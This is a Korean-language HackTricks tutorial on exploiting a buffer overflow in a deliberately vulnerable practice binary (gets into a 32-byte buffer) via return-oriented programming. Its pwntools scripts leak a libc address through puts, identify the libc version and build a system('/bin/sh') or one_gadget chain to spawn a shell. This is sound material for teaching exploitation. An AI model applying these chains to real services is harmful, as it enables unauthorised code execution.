# ROP을 사용하여 libc 주소 누출하기

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 **제로**부터 **히어로**까지 AWS 해킹을 배우세요!</summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고**하거나 **HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구매하세요
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* 💬 **Discord 그룹**에 **가입**하거나 [**텔레그램 그룹**](https://t.me/peass)에 가입하거나 **트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)를 **팔로우**하세요.
* **HackTricks** 및 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.

</details>

## 빠른 요약

1. **오버플로우 오프셋** 찾기
2. `POP_RDI` 가젯, `PUTS_PLT` 및 `MAIN` 가젯 찾기
3. 이전 가젯을 사용하여 puts 또는 다른 libc 함수의 메모리 주소를 **누출**하고 **libc 버전을 찾기** ([다운로드](https://libc.blukat.me))
4. 라이브러리를 사용하여 **ROP를 계산**하고 이를 **악용**하기

## 연습용 다른 자습서 및 이진 파일

이 자습서는 이 자습서에서 제안된 코드/바이너리를 악용할 것입니다: [https://tasteofsecurity.com/security/ret2libc-unknown-libc/](https://tasteofsecurity.com/security/ret2libc-unknown-libc/)\
다른 유용한 자습서: [https://made0x78.com/bseries-ret2libc/](https://made0x78.com/bseries-ret2libc/), [https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)

## 코드

파일명: `vuln.c`
```c
#include <stdio.h>

int main() {
char buffer[32];
puts("Simple ROP.\n");
gets(buffer);

return 0;
}
```

```bash
gcc -o vuln vuln.c -fno-stack-protector -no-pie
```
## ROP - LIBC 주소 노출 템플릿

해킹 도구를 다운로드하고 취약한 이진 파일과 동일한 디렉토리에 배치한 후 스크립트에 필요한 데이터를 제공하십시오:

{% content-ref url="rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)
{% endcontent-ref %}

## 1- 오프셋 찾기

해당 템플릿은 해킹을 계속하기 전에 오프셋이 필요합니다. 제공된 경우 필요한 코드를 실행하여 오프셋을 찾습니다 (기본값은 `OFFSET = ""`):
```bash
###################
### Find offset ###
###################
OFFSET = ""#"A"*72
if OFFSET == "":
gdb.attach(p.pid, "c") #Attach and continue
payload = cyclic(1000)
print(r.clean())
r.sendline(payload)
#x/wx $rsp -- Search for bytes that crashed the application
#cyclic_find(0x6161616b) # Find the offset of those bytes
return
```
**실행** `python template.py`를 하면 프로그램이 충돌한 상태로 GDB 콘솔이 열립니다. 해당 **GDB 콘솔**에서 `x/wx $rsp`를 실행하여 RIP를 덮어쓸 **바이트**를 얻습니다. 마지막으로 **파이썬** 콘솔을 사용하여 **오프셋**을 구합니다:
```python
from pwn import *
cyclic_find(0x6161616b)
```
![](<../../../../.gitbook/assets/image (1004).png>)

오프셋을 찾은 후 (이 경우 40) 해당 값을 사용하여 템플릿 내의 OFFSET 변수를 변경합니다.\
`OFFSET = "A" * 40`

다른 방법은 GEF에서 `pattern create 1000` -- _execute until ret_ -- `pattern seach $rsp`를 사용하는 것입니다.

## 2- 가젯 찾기

이제 이진 파일 내에서 ROP 가젯을 찾아야 합니다. 이 ROP 가젯은 **libc**를 찾기 위해 `puts`를 호출하고, 나중에 **최종 공격을 실행**하는 데 유용할 것입니다.
```python
PUTS_PLT = elf.plt['puts'] #PUTS_PLT = elf.symbols["puts"] # This is also valid to call puts
MAIN_PLT = elf.symbols['main']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep "pop rdi"
RET = (rop.find_gadget(['ret']))[0]

log.info("Main start: " + hex(MAIN_PLT))
log.info("Puts plt: " + hex(PUTS_PLT))
log.info("pop rdi; ret  gadget: " + hex(POP_RDI))
```
`PUTS_PLT`은 **puts 함수**를 호출하기 위해 필요합니다.\
`MAIN_PLT`은 **오버플로우를 다시 이용하여** (무한한 **exploitation** 라운드) **한 상호작용 후에 다시 main 함수를 호출하기 위해 필요합니다.** **각 ROP의 끝에서 프로그램을 다시 호출하는 데 사용됩니다.**\
**POP\_RDI**는 **호출된 함수에 매개변수를 전달하는 데 필요합니다.**

이 단계에서는 실행할 필요가 없습니다. 모든 것이 실행 중에 pwntools에 의해 찾아질 것입니다.

## 3- libc 라이브러리 찾기

이제 사용 중인 **libc 라이브러리 버전**을 찾는 시간입니다. 이를 위해 **메모리에서 puts 함수의 주소를 노출**시킨 다음 해당 주소에 있는 **puts 버전이 있는 라이브러리 버전을 찾을 것입니다.**
```python
def get_addr(func_name):
FUNC_GOT = elf.got[func_name]
log.info(func_name + " GOT @ " + hex(FUNC_GOT))
# Create rop chain
rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)

#Send our rop-chain payload
#p.sendlineafter("dah?", rop1) #Interesting to send in a specific moment
print(p.clean()) # clean socket buffer (read all and print)
p.sendline(rop1)

#Parse leaked address
recieved = p.recvline().strip()
leak = u64(recieved.ljust(8, "\x00"))
log.info("Leaked libc address,  "+func_name+": "+ hex(leak))
#If not libc yet, stop here
if libc != "":
libc.address = leak - libc.symbols[func_name] #Save libc base
log.info("libc base @ %s" % hex(libc.address))

return hex(leak)

get_addr("puts") #Search for puts address in memmory to obtains libc base
if libc == "":
print("Find the libc library and continue with the exploit... (https://libc.blukat.me/)")
p.interactive()
```
이를 위해 실행된 코드의 가장 중요한 줄은 다음과 같습니다:
```python
rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
```
이는 **RIP**를 덮어쓸 수 있는 **OFFSET**까지 일부 바이트를 보냅니다.\
그런 다음, `POP_RDI` 가젯의 **주소**를 설정하여 다음 주소(`FUNC_GOT`)가 **RDI** 레지스터에 저장됩니다. 이는 `PUTS_GOT`의 **주소**를 **전달**하기 위해 **puts 함수의 메모리 주소가 `PUTS_GOT`가 가리키는 주소에 저장되어 있기 때문입니다.\
이후, `PUTS_PLT`가 호출될 것이며 (`PUTS_GOT`이 **RDI**에 들어 있음), puts가 `PUTS_GOT` 내부의 내용(**메모리에 있는 puts 함수의 주소**)을 **읽고 출력**할 것입니다.\
마지막으로 **main 함수가 다시 호출**되어 오버플로우를 다시 악용할 수 있습니다.

이렇게 함으로써 우리는 puts 함수를 속이고 **메모리**에 있는 **puts 함수의 주소**(이는 **libc** 라이브러리 내부에 있는 것)를 **출력**하도록 합니다. 이제 해당 주소를 가지고 **어떤 libc 버전이 사용 중인지 찾을 수 있습니다**.

로컬 이진 파일을 **악용**하고 있기 때문에 **libc** 버전을 찾을 필요가 없습니다(`/lib/x86_64-linux-gnu/libc.so.6`에서 라이브러리를 찾기만 하면 됩니다).\
그러나 원격 악용 케이스에서는 어떻게 찾을 수 있는지 여기서 설명하겠습니다:

### 3.1- libc 버전 검색 (1)

웹 페이지에서 사용 중인 라이브러리를 검색할 수 있습니다: [https://libc.blukat.me/](https://libc.blukat.me)\
이를 통해 발견된 **libc** 버전을 다운로드할 수도 있습니다.

![](<../../../../.gitbook/assets/image (1046).png>)

### 3.2- libc 버전 검색 (2)

또한 다음을 수행할 수 있습니다:

* `$ git clone https://github.com/niklasb/libc-database.git`
* `$ cd libc-database`
* `$ ./get`

이 작업에는 시간이 걸릴 수 있으니 기다려주십시오.\
작동하려면 다음이 필요합니다:

* Libc 심볼 이름: `puts`
* 누출된 libc 주소: `0x7ff629878690`

가장 가능성이 높은 **libc**를 알 수 있습니다.
```bash
./find puts 0x7ff629878690
ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)
archive-glibc (id libc6_2.23-0ubuntu11_amd64)
```
우리는 2개의 매치를 얻었습니다 (첫 번째가 작동하지 않으면 두 번째를 시도해보세요). 첫 번째 것을 다운로드하세요:
```bash
./download libc6_2.23-0ubuntu10_amd64
Getting libc6_2.23-0ubuntu10_amd64
-> Location: http://security.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.23-0ubuntu10_amd64.deb
-> Downloading package
-> Extracting package
-> Package saved to libs/libc6_2.23-0ubuntu10_amd64
```
### 3.3- 라이브러리 주소 누출을 위한 다른 함수들

`libs/libc6_2.23-0ubuntu10_amd64/libc-2.23.so`에서 libc를 작업 디렉토리로 복사합니다.
```python
puts
printf
__libc_start_main
read
gets
```
## 4- libc 주소 찾기 및 이용

이 시점에서 우리는 사용된 libc 라이브러리를 알아야 합니다. 로컬 바이너리를 이용하기 때문에 `/lib/x86_64-linux-gnu/libc.so.6`를 사용할 것입니다.

그래서 `template.py`의 시작 부분에서 **libc** 변수를 다음과 같이 변경하십시오: `libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") #Set library path when know it`

**libc 라이브러리의 경로**를 제공하면 **나머지 exploit이 자동으로 계산**됩니다.

`get_addr` 함수 내에서 **libc의 베이스 주소**가 계산됩니다:
```python
if libc != "":
libc.address = leak - libc.symbols[func_name] #Save libc base
log.info("libc base @ %s" % hex(libc.address))
```
{% hint style="info" %}
**최종 libc 기본 주소는 반드시 00으로 끝나야** 합니다. 그렇지 않은 경우 잘못된 라이브러리를 누설할 수 있습니다.
{% endhint %}

그런 다음 `system` 함수의 주소와 _"/bin/sh"_ 문자열의 **주소**는 **libc**의 **기본 주소**에서 **계산**되며 주어진 **libc 라이브러리**를 사용합니다.
```python
BINSH = next(libc.search("/bin/sh")) - 64 #Verify with find /bin/sh
SYSTEM = libc.sym["system"]
EXIT = libc.sym["exit"]

log.info("bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))
```
마침내, /bin/sh 실행 exploit이 준비되어 전송될 것입니다:
```python
rop2 = OFFSET + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM) + p64(EXIT)

p.clean()
p.sendline(rop2)

#### Interact with the shell #####
p.interactive() #Interact with the conenction
```
## 최종 ROP 설명

마지막 ROP(`rop1`)은 다시 main 함수를 호출하여 **다시 exploit**할 수 있습니다. 따라서 `OFFSET`이 다시 여기에 있습니다. 그런 다음, _"/bin/sh"_의 **주소**(`BINSH`)를 가리키는 `POP_RDI`를 호출하고 **system** 함수(`SYSTEM`)를 호출하여 _"/bin/sh"_의 주소가 매개변수로 전달되도록 합니다.\
마지막으로 **exit 함수의 주소**가 **호출**되어 프로세스가 **잘 종료**되고 어떤 경고도 발생하지 않습니다.

**이렇게 하면 exploit이 \_/bin/sh**\_\*\* 쉘을 실행**합니다.\*\*

![](<../../../../.gitbook/assets/image (162).png>)

## 4(2)- ONE\_GADGET 사용

[**ONE\_GADGET** ](https://github.com/david942j/one\_gadget)을 사용하여 **system** 및 **"/bin/sh"** 대신 쉘을 얻을 수도 있습니다. **ONE\_GADGET**은 libc 라이브러리 내에서 하나의 **ROP 주소**만 사용하여 쉘을 얻는 방법을 찾습니다.\
그러나 일반적으로 `[rsp+0x30] == NULL`와 같은 제약 조건이 있습니다. **RSP** 내의 값을 제어할 수 있기 때문에 제약 조건을 피하려면 몇 가지 추가 NULL 값을 보내면 됩니다.

![](<../../../../.gitbook/assets/image (751).png>)
```python
ONE_GADGET = libc.address + 0x4526a
rop2 = base + p64(ONE_GADGET) + "\x00"*100
```
## EXPLOIT FILE

이 취약점을 악용하는 템플릿을 다음에서 찾을 수 있습니다:

{% content-ref url="rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)
{% endcontent-ref %}

## 일반적인 문제

### MAIN\_PLT = elf.symbols\['main']를 찾을 수 없음

"main" 심볼이 존재하지 않는 경우, main 코드가 어디에 있는지 찾을 수 있습니다:
```python
objdump -d vuln_binary | grep "\.text"
Disassembly of section .text:
0000000000401080 <.text>:
```
그리고 주소를 수동으로 설정하십시오:
```python
MAIN_PLT = 0x401080
```
### Puts를 찾을 수 없음

만약 이진 파일이 Puts를 사용하지 않는다면 다음을 확인해야 합니다.

### `sh: 1: %s%s%s%s%s%s%s%s: not found`

모든 exploit을 생성한 후에 이 **에러**를 발견한다면: `sh: 1: %s%s%s%s%s%s%s%s: not found`

**"/bin/sh" 주소에서 64바이트를 빼보세요**:
```python
BINSH = next(libc.search("/bin/sh")) - 64
```
<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 제로부터 영웅이 될 때까지 AWS 해킹을 배우세요!</summary>

HackTricks를 지원하는 다른 방법:

* **회사가 HackTricks에 광고되길 원하거나 HackTricks를 PDF로 다운로드하고 싶다면** [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구매하세요
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **가입**하거나 **트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)를 **팔로우**하세요.
* **HackTricks** 및 **HackTricks Cloud** github 저장소에 PR을 제출하여 해킹 트릭을 공유하세요.

</details>
